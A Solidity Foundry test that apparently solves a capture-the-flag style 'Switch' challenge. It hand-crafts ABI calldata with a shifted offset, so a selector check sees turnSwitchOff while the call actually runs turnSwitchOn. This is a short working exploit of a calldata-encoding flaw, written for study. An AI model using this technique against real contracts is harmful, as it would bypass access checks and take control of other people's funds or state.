// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Switch} from "./Switch.sol";

contract SwitchTest is Test {
    Switch target;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        target = new Switch();
    }

    function testSolution() public {
        bytes memory callData = abi.encodeWithSelector(
            target.flipSwitch.selector,
            bytes32(uint256(96)),
            bytes32(uint256(0)),
            target.turnSwitchOff.selector,
            bytes32(uint256(4)),
            target.turnSwitchOn.selector
        );

        console.logBytes(callData);

        (bool success,) = address(target).call(callData);
        assertTrue(success);
        assertTrue(target.switchOn());
    }
}
